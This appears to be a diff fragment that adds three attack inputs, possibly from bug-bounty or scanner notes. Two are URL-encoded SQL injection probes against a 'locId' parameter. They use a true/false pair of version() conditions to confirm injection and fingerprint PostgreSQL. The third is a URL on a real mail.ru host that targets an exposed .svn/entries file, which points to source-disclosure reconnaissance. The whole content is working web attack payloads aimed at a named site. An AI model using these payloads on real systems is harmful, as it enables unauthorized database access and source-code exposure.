@@ -1,0 +1,3 @@
+78976538+and+case+when+substr(version(),1,10)=%27PostgreSQL%27+then+true+else+cast(version()%20as%20numeric)=1+end
+locId=78976538+and+case+when+substr(version(),1,10)=%27PostgreXXX%27+then+true+else+cast(version()%20as%20numeric)=1+end
+https://element.mail.ru/.svn/entries
